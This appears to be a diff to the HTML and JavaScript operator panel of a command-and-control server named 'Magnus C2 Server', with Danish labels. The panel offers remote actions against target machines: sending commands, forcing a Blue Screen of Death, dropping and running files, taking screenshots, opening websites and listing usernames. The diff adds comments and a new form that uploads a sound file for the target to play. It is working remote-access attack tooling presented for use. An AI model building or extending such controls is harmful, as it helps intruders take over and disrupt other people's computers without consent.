@@ -70,21 +70,29 @@
         <div class="center scroll greyColor fullScreen">
             <h1 class="title">Magnus C2 Server</h1>
             <input type="password" id="key" name="key" placeholder="Key">
+
+            <!-- Command -->
             <h3 class="title">Command</h3>
             <input type="text" id="command" name="command" placeholder="Command">
             <br><br>
             <button class="sendButton" style="background-color: blueviolet;" onclick="sendCommand()">Send
                 Command!</button>
+
+            <!-- Vis billede -->
             <h3 class="title">Vis billede</h3>
             <form enctype="multipart/form-data" id="imageForm">
                 <input type="file" id="image" name="image">
                 <br><br>
                 <input type="submit" class="sendButton" style="background-color: greenyellow;" value="Send Billede!">
             </form>
+
+            <!-- Blue Screen Of Death (BSOD) -->
             <h3 class="title">Blue Screen Of Death (BSOD)</h3>
             <label class="label">Virker kun på windows!</label>
             <br><br>
             <button class="sendButton" style="background-color: blue;" onclick="sendBSOD()">Start BSOD!</button>
+
+            <!-- Kør fil -->
             <h3 class="title">Kør fil</h3>
             <label class="label">Virker kun på windows!</label>
             <form enctype="multipart/form-data" id="runFileForm">
@@ -94,6 +102,8 @@
                 <br><br>
                 <input type="submit" class="sendButton" style="background-color: orange;" value="Send Fil!">
             </form>
+
+            <!-- Screenshot -->
             <h3 class="title">Screenshot</h3>
             <button onclick="takeScreenshot()" class="sendButton" style="background-color: crimson;">Tag
                 screenshot!</button>
@@ -101,6 +111,8 @@
             <label class="label" style="font-weight: normal;">Links til screenshots kommer her:</label>
             <br>
             <textarea id="screenshotUrlsArea" name="screenshotUrlsArea" class="textarea"></textarea>
+
+            <!-- Åbn Website -->
             <h3 class="title">Åbn Website</h3>
             <label class="label">Virker kun på windows!</label>
             <br>
@@ -108,6 +120,8 @@
             <br><br>
             <button class="sendButton" style="background-color: blueviolet;" onclick="sendWebsite()">Åbn
                 Hjemmeside!</button>
+
+            <!-- Drop fil -->
             <h3 class="title">Drop fil</h3>
             <form enctype="multipart/form-data" id="dropFileForm">
                 <input type="file" id="dropFile" name="dropFile">
@@ -117,15 +131,46 @@
                 <br><br>
                 <input type="submit" class="sendButton" style="background-color: orange;" value="Send Fil!">
             </form>
+
+            <!-- Hent Brugernavne -->
             <h3 class="title">Hent Brugernavne</h3>
             <button onclick="getUsers()" class="sendButton" style="background-color: crimson;">Hent brugere!</button>
             <br>
             <label class="label" style="font-weight: normal;">Brugernavne kommer her:</label>
             <br>
             <textarea id="usernamesArea" name="usernamesArea" class="textarea"></textarea>
+
+            <!-- Afspil lydfil -->
+            <h3 class="title">Afspil lydfil</h3>
+            <form enctype="multipart/form-data" id="playsoundForm">
+                <input type="file" id="soundFile" name="soundFile">
+                <br><br>
+                <input type="submit" class="sendButton" style="background-color: greenyellow;" value="Send Lydfil!">
+            </form>
         </div>
 
         <script>
+            var playsoundForm = document.getElementById("playsoundForm");
+            playsoundForm.onsubmit = function (event) {
+                var playsoundForm = event.currentTarget;
+                var playsoundFormData = new FormData(playsoundForm);
+
+                key = document.getElementById("key").value;
+
+                fetch(`${document.URL}/post_playsound?key=${key}`, { "method": "POST", "body": playsoundFormData })
+                    .then(response => {
+                        if (response.status == 200) {
+                            alert("Lydfil sendt!");
+                        } else if (response.status == 403) {
+                            alert("Forkert key!");
+                        } else {
+                            alert("Ukendt fejl!")
+                        }
+                    });
+
+                event.preventDefault();
+            }
+
             var imageForm = document.getElementById("imageForm");
             imageForm.onsubmit = function (event) {
                 var imageForm = event.currentTarget;
